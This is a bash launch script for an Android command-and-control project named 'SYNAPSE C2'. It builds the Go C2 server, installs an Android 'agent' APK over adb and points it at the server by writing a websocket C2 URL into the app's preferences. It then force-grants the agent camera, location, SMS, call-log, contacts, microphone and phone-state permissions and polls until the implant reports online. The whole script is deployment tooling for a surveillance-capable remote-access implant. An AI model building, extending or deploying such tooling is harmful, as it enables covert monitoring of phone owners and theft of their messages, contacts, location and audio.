#!/bin/bash
# ═══════════════════════════════════════════════════════
# SYNAPSE — ONE-COMMAND LAUNCH
# Usage: bash run.sh
# ═══════════════════════════════════════════════════════
set -e

ROOT="$(cd "$(dirname "$0")" && pwd)"
IP=$(ip addr show wlo1 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
GOROOT="$HOME/go"
GOPATH="$HOME/go-projects"
JAVA_HOME="$HOME/.local/share/JetBrains/Toolbox/apps/android-studio/jbr"
DEVICE="a2a99ec51033f84f"

export PATH="$GOROOT/bin:$GOPATH/bin:$PATH"
export JAVA_HOME

echo "╔══════════════════════════════════════════╗"
echo "║       SYNAPSE C2 — Quick Launch        ║"
echo "╠══════════════════════════════════════════╣"
echo "║ IP: $IP"
echo "║ Device: $DEVICE"
echo "╚══════════════════════════════════════════╝"

# 1. Build server if needed
if [ ! -f /tmp/synapse-server ] || [ "$ROOT/Umbra-Server/synapse-c2/app/synapse-c2" -nt /tmp/synapse-server ]; then
    echo "[1/4] Building Go server..."
    cd "$ROOT/Umbra-Server/synapse-c2/app/synapse-c2"
    go build -o /tmp/synapse-server .
fi

# 2. Build Android if needed
APK="$ROOT/Umbra-Client/app/build/outputs/apk/debug/app-debug.apk"
echo "[2/4] Building Android APK..."
cd "$ROOT/Umbra-Client"
./gradlew assembleDebug -q 2>/dev/null

# 3. Kill old server & start new
echo "[3/4] Starting C2 server..."
fuser -k 8443/tcp 2>/dev/null || true
sleep 1
/tmp/synapse-server &
sleep 2

# 4. Install & launch agent
echo "[4/4] Deploying agent..."
adb install -r "$APK" 2>/dev/null
sleep 2
# Clear old prefs and set C2 URL to current IP
adb shell pm clear org.synapse.core 2>/dev/null
sleep 1
adb shell mkdir -p /data/data/org.synapse.core/shared_prefs 2>/dev/null
adb shell "echo 'wss://$IP:8443/c2' > /data/data/org.synapse.core/shared_prefs/synapse_c2_url" 2>/dev/null || true
for perm in POST_NOTIFICATIONS CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION \
    READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_PHONE_STATE \
    READ_SMS READ_CALL_LOG READ_CONTACTS RECORD_AUDIO; do
    adb shell pm grant org.synapse.core android.permission.$perm 2>/dev/null || true
done
adb shell am force-stop org.synapse.core 2>/dev/null || true
sleep 1
adb shell am start -n org.synapse.core/.MainActivity 2>/dev/null || true

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║  Dashboard: https://$IP:8443           ║"
echo "║  Health:    https://$IP:8443/api/health║"
echo "║  Server PID: $(pgrep -f synapse-server)                        ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "Waiting for agent connection..."
for i in 1 2 3 4 5; do
  sleep 4
  STATUS=$(curl -k -s "https://localhost:8443/api/devices" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for x in d.get('devices',[]):
    print(f'{x[\"id\"][:16]}... online={x[\"online\"]} model={x[\"info\"].get(\"model\",\"?\")}')
" 2>/dev/null)
  echo "  [$i] $STATUS"
  if echo "$STATUS" | grep -q "online=True"; then
    echo ""
    echo "╔══════════════════════════════════════════╗"
    echo "║  AGENT ONLINE — Ready                   ║"
    echo "╠══════════════════════════════════════════╣"
    echo "║  Dashboard: https://$IP:8443            ║"
    echo "╚══════════════════════════════════════════╝"
    exit 0
  fi
done
echo "Agent did not come online — check: adb logcat -s Synapse:V"
